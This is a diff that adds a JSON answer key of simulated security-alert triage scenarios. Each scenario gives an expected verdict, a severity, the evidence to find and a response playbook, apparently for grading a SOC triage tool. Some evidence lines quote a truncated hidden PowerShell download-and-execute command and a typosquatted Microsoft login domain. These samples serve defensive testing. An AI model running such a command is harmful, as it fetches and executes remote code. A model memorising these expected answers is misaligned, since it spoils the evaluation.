+      "CMDB asset Laptop-HR05 (CI00092) at 192.168.2.55 is Production with High criticality; function: Laptop for an HR Business Partner. Contains PII.",
+      "EDR event EDR-EVT-9001 ProcessCreate by powershell.exe cmd powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring... user s.adams at 2025-10-26T11:14:08Z",
+      "EDR event EDR-EVT-9002 NetworkConnection by powershell.exe user s.adams at 2025-10-26T11:14:09Z",
+      "DNS query from Laptop-HR05 to secure-microsft-login.com (NOERROR).",
+      "Web proxy GET to http://secure-microsft-login.com/owa/auth/logon.aspx?url=...&reason=2 by s.adams action Allowed.",
+      "Network VLAN 15 (VLAN-Workstations-HR): Same as Main Office, but with stricter data loss prevention (DLP) rules on outbound traffic. Internet access is limited to whitelisted domains.",
+      "Service policy POL-001 marks TCP/21 as Forbidden: This protocol is unencrypted and poses a security risk. All use is forbidden both internally and externally. Use SFTP (TCP/22) or other secure file transfer methods instead."
+    ],
+    "expected_course_of_action": "Isolate the host. Block the destination IP at the firewall. Investigate the workstation to identify the file that was transferred and the process that initiated the connection. This could be an insider threat or a compromised machine.",
+    "expected_playbook_id": "PB-EXFIL-001"
+  },
+  {
+    "scenario": "Benign - Developer Using Nmap on Staging",
+    "expected_verdict": "Benign True Positive",
+    "expected_severity_range": [
+      "Informational"
+    ],
+    "key_evidence_to_find": [
+      "CMDB asset Workstation-Dev07 (CI00039) at 10.0.15.105 is Production with Medium criticality; function: Developer workstation for a backend software engineer.",
+      "Network VLAN 50 (VLAN-Development): Permissive outbound internet access. Intra-VLAN traffic is unrestricted to allow for testing. Access to Production Server VLANs is strictly forbidden, except for read-only access to specific database replicas."
+    ],
+    "expected_course_of_action": "No action required, but document the event. Verify with the development team lead that this activity is expected. Consider creating a policy to suppress 'reconnaissance' alerts that are confined to the development VLAN."
+  },
+  {
+    "scenario": "Benign - Admin RDP to Server",
+    "expected_verdict": "Benign True Positive",
+    "expected_severity_range": [
+      "Informational"
+    ],
+    "key_evidence_to_find": [
+      "CMDB asset AppServer-CRM01 (CI00018) at 10.0.5.80 is Production with High criticality; function: Application server hosting the internal CRM platform. Connects to Salesforce API.",
+      "Vulnerability VULN-1006 (VMware Tools Privilege Escalation Vulnerability) on AppServer-CRM01 severity High status Open.",
+      "EDR event EDR-EVT-9011 NetworkConnection by mstsc.exe user j.smith at 2025-11-04T10:10:11Z",
+      "DNS query from AppServer-CRM01 to api.salesforce.com (NOERROR).",
+      "Web proxy POST to https://api.salesforce.com/services/data/v56.0/sobjects/Account/ by sql_service action Allowed.",
+      "CMDB asset Workstation-ITAdmin01 (CI00028) at 10.0.10.15 is Production with High criticality; function: Privileged Access Workstation (PAW) for a Senior Systems Administrator.",
+      "Network VLAN 40 (VLAN-IT-Admin-Security): Highly restricted internet access. Allowed to initiate RDP and SSH to all internal server VLANs. Source for authorized vulnerability scans.",
+      "Service policy POL-011 marks TCP/3389 as Restricted: For remote GUI administration of Windows Servers."
+    ],
+    "expected_course_of_action": "No action required. This is expected and authorized administrative access. Log the event for audit purposes."
+  },
+  {
+    "scenario": "Malicious - New Service Creation for Persistence",
+    "expected_verdict": "True Positive",
+    "expected_severity_range": [
+      "High"
+    ],
+    "key_evidence_to_find": [
+      "CMDB asset Laptop-HR05 (CI00092) at 192.168.2.55 is Production with High criticality; function: Laptop for an HR Business Partner. Contains PII.",
+      "EDR event EDR-EVT-9001 ProcessCreate by powershell.exe cmd powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring... user s.adams at 2025-10-26T11:14:08Z",
+      "EDR event EDR-EVT-9002 NetworkConnection by powershell.exe user s.adams at 2025-10-26T11:14:09Z",
+      "DNS query from Laptop-HR05 to secure-microsft-login.com (NOERROR).",
+      "Web proxy GET to http://secure-microsft-login.com/owa/auth/logon.aspx?url=...&reason=2 by s.adams action Allowed.",
+      "EDR event EDR-EVT-9008 ProcessCreate by svchost.exe cmd C:\\Windows\\System32\\svchost.exe -k DcomLaunch... user SYSTEM at 2025-11-02T08:12:40Z",
+      "EDR event EDR-EVT-9009 ServiceCreate by None user SYSTEM at 2025-11-04T15:05:25Z"
+    ],
+    "expected_course_of_action": "Isolate the host. Disable and delete the malicious service. Delete the associated executable file. Investigate the host to determine the initial infection vector.",
+    "expected_playbook_id": "PB-MAL-001"
+  },
+  {
+    "scenario": "Suspicious - High Volume of Outbound SMTP Traffic",
+    "expected_verdict": "True Positive",
+    "expected_severity_range": [
+      "High"
+    ],
+    "key_evidence_to_find": [
+      "CMDB asset Workstation-Sales21 (CI00078) at 192.168.1.101 is Production with Medium criticality; function: Standard workstation for a sales associate.",
+      "Vulnerability VULN-1005 (Microsoft Office and Windows HTML RCE Vulnerability) on Workstation-Sales21 severity High status Open.",
+      "DNS query from Workstation-Sales21 to hotmail.com (NOERROR).",
+      "Network VLAN 10 (VLAN-Workstations-MainOffice): Allowed outbound internet access via proxy. Allowed access to Server Farm on ports 443, 1433, 8080. Allowed access to File Servers on port 445. RDP/SSH from this VLAN to servers is forbidden.",
+      "Service policy POL-003 marks TCP/25 as Restricted: For sending email. Only authorized internal mail servers are allowed to send SMTP traffic to external destinations."
+    ],
+    "expected_course_of_action": "Isolate the host from the network. Block outbound SMTP traffic from all non-mail server IPs at the firewall. Scan the host for spam-sending malware. Check if the company's external IP has been added to any spam blacklists.",
+    "expected_playbook_id": "PB-EXFIL-001"
+  }
+]
